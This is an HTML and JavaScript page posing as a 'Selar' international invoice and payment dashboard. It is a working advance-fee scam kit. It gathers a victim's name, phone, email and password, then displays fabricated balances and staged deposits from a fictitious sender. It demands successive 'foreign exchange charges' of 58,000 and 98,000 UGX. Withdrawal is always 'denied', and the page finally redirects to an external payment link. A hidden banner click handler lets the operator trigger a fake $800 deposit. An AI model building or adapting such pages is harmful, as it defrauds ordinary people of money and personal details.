<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Selar Transaction System - Chicago Theme</title>
    <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --jpesa-blue: #1a73e8;
            --jpesa-red: #d93025;
            --bg-light: #f1f3f4;
            --dark-text: #202124;
            --border-gray: #dadce0;
            --success-green: #00a65a;
            --selar-brown: #8b4513;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: var(--bg-light);
            margin: 0;
            display: flex;
            justify-content: center;
            min-height: 100vh;
        }

        .container {
            background: white;
            width: 100%;
            max-width: 500px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
            position: relative;
            overflow: hidden;
        }

        .top-banner {
            height: 60px;
            background: linear-gradient(90deg, #ffffff 0%, #1a73e8 70%, #8ab4f8 100%);
            display: flex;
            align-items: center;
            padding: 0 15px;
        }

        .header-content { text-align: right; padding: 20px; }
        .jpesa-title { color: var(--jpesa-red); font-size: 1.2rem; font-weight: bold; margin: 0; }
        .jpesa-sub { font-size: 0.7rem; color: #555; line-height: 1.2; }

        .bank-logo { color: var(--jpesa-blue); font-size: 60px; margin: 20px; text-align:center; }

        .form-section { padding: 0 30px 30px; }
        
        .header-login { background: var(--selar-brown); color: white; padding: 8px; font-weight: bold; letter-spacing: 2px; text-align: center; margin: 20px 0; }
        .header-dash { background: var(--success-green); color: white; padding: 8px; font-weight: bold; letter-spacing: 2px; text-align: center; margin: 20px 0; }
        
        .field { margin-bottom: 15px; text-align: left; }
        label { display: block; font-size: 0.75rem; font-weight: bold; color: #666; text-transform: uppercase; margin-bottom: 4px; }
        input { width: 100%; padding: 12px; border: 1px solid var(--border-gray); border-radius: 4px; box-sizing: border-box; background: #fafafa; }

        .btn-action {
            background: var(--success-green);
            color: white;
            border: none;
            width: 100%;
            padding: 15px;
            border-radius: 30px;
            font-weight: bold;
            cursor: pointer;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
            margin-top: 10px;
        }

        .receipt-card {
            border: 1px solid var(--border-gray);
            padding: 15px;
            position: relative;
            background: #fff;
            margin-top: 15px;
        }

        @keyframes blinker { 50% { opacity: 0; } }
        .blink-green { color: var(--success-green); font-weight: bold; animation: blinker 1s linear infinite; }
        .live-tag { color: var(--success-green); font-weight: bold; font-size: 0.7rem; animation: blinker 1.5s linear infinite; margin-left: 5px; }

        .payment-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px; margin: 20px 0; }
        .pay-box { border: 1px solid var(--border-gray); border-radius: 8px; padding: 10px; text-align: center; font-size: 0.7rem; font-weight: bold; background: #fff; }
        
        .color-stripe { color: var(--jpesa-blue); cursor: pointer; }
        .color-epay { color: var(--success-green); cursor: pointer; }

        .progress-container { width: 100%; background-color: #ddd; border-radius: 10px; margin: 15px 0; height: 10px; }
        .progress-bar { width: 0%; height: 100%; background-color: var(--success-green); border-radius: 10px; transition: width 0.1s linear; }

        .overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 1000; justify-content: center; align-items: center; padding: 20px; }
        .modal { background: white; padding: 25px; border-radius: 8px; max-width: 420px; width: 100%; text-align: center; box-shadow: 0 0 20px rgba(0,0,0,0.3); }

        .loading-ring { border: 4px solid #f3f3f3; border-top: 4px solid var(--jpesa-blue); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 15px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        .user-info-header { font-weight: bold; color: var(--dark-text); margin-bottom: 5px; text-transform: uppercase; border-bottom: 1px solid #eee; padding-bottom: 5px; }
    </style>
</head>
<body>

<div class="container" id="app">
    <div class="top-banner">
        <div style="background: white; padding: 5px; border-radius: 4px; display: flex; align-items: center; cursor: pointer;" onclick="configInvoice800()">
            <span style="color:#0033a0; font-weight:bold; font-size: 10px;">Selar visa MasterCard Invoice</span>
        </div>
    </div>

    <div class="header-content">
        <p class="jpesa-title">Selar invoice International</p>
        <p class="jpesa-sub">Plot Z, USA, Chicago, Brooklyn Street Road<br>P.O. Box 25630 - Chicago<br>+1-USA</p>
    </div>

    <div id="loginPage" class="form-section">
        <div class="bank-logo">üèõÔ∏è</div>
        <div class="header-login">SELAR ACCOUNT</div>
        
        <div class="field"><label>Legal Full Name</label><input type="text" id="regName" placeholder=""></div>
        <div class="field"><label>Telephone Number</label><input type="text" id="regPhone" placeholder=""></div>
        <div class="field"><label>Email Address</label><input type="email" id="regEmail" placeholder=""></div>
        <div style="display:flex; gap:10px;">
            <div class="field" style="flex:1;"><label>Password</label><input type="password" placeholder="******"></div>
            <div class="field" style="flex:1;"><label>Confirm</label><input type="password" placeholder="******"></div>
        </div>
        <button class="btn-action" onclick="register()">OPEN YOUR SELAR ACCOUNT</button>
    </div>

    <div id="dashboard" class="form-section" style="display:none;">
        <div class="header-dash">SELAR INVOICE ACCOUNT</div>
        
        <div id="userInfoDisplay" class="user-info-header"></div>
        
        <div style="background: #f8f9fa; padding: 15px; border-radius: 8px; border-left: 5px solid var(--jpesa-blue);">
            <div style="font-size: 0.8rem; color: #666;">AVAILABLE BALANCE</div>
            <div id="ugxBalance" style="font-size: 1.8rem; font-weight: bold; color: var(--jpesa-blue);">743,000UGX</div>
            <div style="font-size: 1rem;">Exact: <span id="usdBalance" class="blink-green">200.00$</span></div>
        </div>

        <div id="mainNotif" class="receipt-card">
            <p id="notifText" style="font-size: 0.85rem; color: #444; margin: 0;">Successfully registered your SIM Card on Selar system. Send/Receive globally.</p>
        </div>

        <div style="display:flex; gap:10px; margin-top:15px;">
            <button class="btn-action" style="margin:0; background: var(--jpesa-blue);" onclick="handleAction()">Withdrawal</button>
            <button class="btn-action" style="margin:0; background: #444;" onclick="handleAction()">Receive</button>
        </div>

        <div class="payment-grid">
            <div class="pay-box" style="color: red; cursor: not-allowed;">AIRTEL</div>
            <div class="pay-box" style="cursor: not-allowed;"><span style="color: blue;">MTN</span> <span style="color: #ffd700;">MOMO</span></div>
            <div class="pay-box color-stripe">STRIPE</div>
            <div class="pay-box color-epay" onclick="confirmEpay()">EPAY</div>
        </div>

        <div id="recentActivity" class="receipt-card" style="border-top: 3px solid var(--success-green);">
            <div style="display:flex; align-items:center; margin-bottom: 10px;">
                <label style="margin:0;">Recent Activity</label>
                <span id="liveTag" class="">LIVE</span>
            </div>
            <div id="activityLog" style="color: var(--jpesa-blue); font-weight: bold; font-size: 0.95rem; background: #f0fdf4; padding: 10px; border-radius: 5px;">No transactions</div>
        </div>
    </div>
</div>

<div id="overlay" class="overlay">
    <div class="modal" id="modalContent"></div>
</div>

<script>
    let state = JSON.parse(localStorage.getItem('selarStateChicagoCmd')) || { step: 0, name: '', phone: '' };

    window.onload = () => { if(state.step > 0) renderStep(); };

    function save() { localStorage.setItem('selarStateChicagoCmd', JSON.stringify(state)); }

    function register() {
        state.name = document.getElementById('regName').value;
        state.phone = document.getElementById('regPhone').value;
        
        const ov = document.getElementById('overlay');
        ov.style.display = 'flex';
        document.getElementById('modalContent').innerHTML = `
            <h3>Your Selar account loading</h3>
            <div class="progress-container"><div id="regProgress" class="progress-bar"></div></div>
            <p id="progText">0%</p>
        `;

        let width = 0;
        let interval = setInterval(() => {
            if (width >= 100) {
                clearInterval(interval);
                ov.style.display = 'none';
                state.step = 1;
                save();
                renderStep();
            } else {
                width += 2;
                document.getElementById('regProgress').style.width = width + '%';
                document.getElementById('progText').innerText = width + '%';
            }
        }, 100);
    }

    function renderStep() {
        document.getElementById('loginPage').style.display = 'none';
        document.getElementById('dashboard').style.display = 'block';
        document.getElementById('userInfoDisplay').innerText = `${state.name} | ${state.phone}`;

        if(state.step === 1) {
            document.getElementById('notifText').innerHTML = `OFFICIAL NOTICE: Your SIM Card doesn't support dollar deposit. Recharge with exchange charge of <b style="color: var(--jpesa-red);">58,000UGX</b>. Click withdrawal and fill 07XXXXX.`;
        }

        if(state.step === 2) { // Paid 58k
            document.getElementById('notifText').innerHTML = `<div style="padding:10px; border: 2px solid var(--success-green); border-radius:10px; background:#f0fdf4; color:var(--success-green); font-weight:bold; text-align:center;">PAID! foreign exchange exchange charge of 58,000UGX by ${state.name} (${state.phone})</div>`;
            document.getElementById('activityLog').innerText = "Received 200.00$ from lolikishee, USA";
        }

        if(state.step === 3) { // 800$ configured
            document.getElementById('ugxBalance').innerText = "2,906,702.40UGX";
            document.getElementById('usdBalance').innerText = "800.00$";
            document.getElementById('usdBalance').classList.add('blink-green');
            document.getElementById('liveTag').classList.add('live-tag');
            document.getElementById('notifText').innerHTML = `Foreign exchange charge needed <b>98,000UGX</b> to allow 800$ into UGX, Click withdrawal then on the next page fill in your mobile number 07XXX and you allow notification to deposit invoice transaction on Your mobile number account`;
            document.getElementById('activityLog').innerHTML = `<span style="color:#e91e63">Received Amount 800.00$ from lolikishee, USA CHICAGO</span>`;
            document.getElementById('activityLog').style.background = "linear-gradient(45deg, #f0fdf4, #e0f2fe)";
        }
    }

    function confirmEpay() {
        if(state.step >= 2) return;
        const ov = document.getElementById('overlay');
        ov.style.display = 'flex';
        document.getElementById('modalContent').innerHTML = `<div class="loading-ring"></div><p>Confirming payment of Foreign exchange charge by ${state.name} (${state.phone})</p>`;
        
        setTimeout(() => {
            ov.style.display = 'none';
            state.step = 2;
            save();
            renderStep();
        }, 10000);
    }

    function handleAction() {
        if(state.step === 3) {
            window.location.href = "https://pay.guto.app/@selara4?a=98000";
            return;
        }

        const ov = document.getElementById('overlay');
        ov.style.display = 'flex';
        document.getElementById('modalContent').innerHTML = `<div class="loading-ring"></div><p>initiating transactions of 743,000UGX to ${state.name} (${state.phone})</p>`;
        
        setTimeout(() => {
            document.getElementById('modalContent').innerHTML = `
                <div style="padding:20px;">
                    <h3 style="color:var(--jpesa-red)">Withdrawal Denied</h3>
                    <p style="font-size:0.9rem; line-height:1.5; color:#555;">Accuse us our Customer, Selar system Can't allow withdraw of international transaction which is less than 1million Ugandan Shillings, Please Consult the sender to top up the invoice to enable the withdraw directly to your Sim card</p>
                    <button class="btn-action" onclick="document.getElementById('overlay').style.display='none'">okay have understood!</button>
                </div>
            `;
        }, 10000);
    }

    function configInvoice800() {
        if(state.step < 2 || state.step === 3) return;
        const ov = document.getElementById('overlay');
        ov.style.display = 'flex';
        document.getElementById('modalContent').innerHTML = `<div class="loading-ring"></div><p>Configuring selar invoice transaction of 800$ to Your Selar account</p>`;
        
        setTimeout(() => {
            document.getElementById('modalContent').innerHTML = `
                <div style="padding:10px;">
                    <h3>Deposit Detected</h3>
                    <p style="font-size:0.9rem; text-align:left;"><b>Amount:</b> 800$<br><b>Sender ID:</b> A001112<br><b>Name:</b> lolikishee<br><b>Address:</b> USA CHICAGO</p>
                    <p style="font-size:0.8rem; color:#666;">Press confirm to initiate the transaction on Your Selar account.</p>
                    <button class="btn-action" onclick="finalize800()">Confirm</button>
                </div>
            `;
        }, 10000);
    }

    function finalize800() {
        document.getElementById('overlay').style.display = 'none';
        state.step = 3;
        save();
        renderStep();
    }
</script>
</body>
</html>
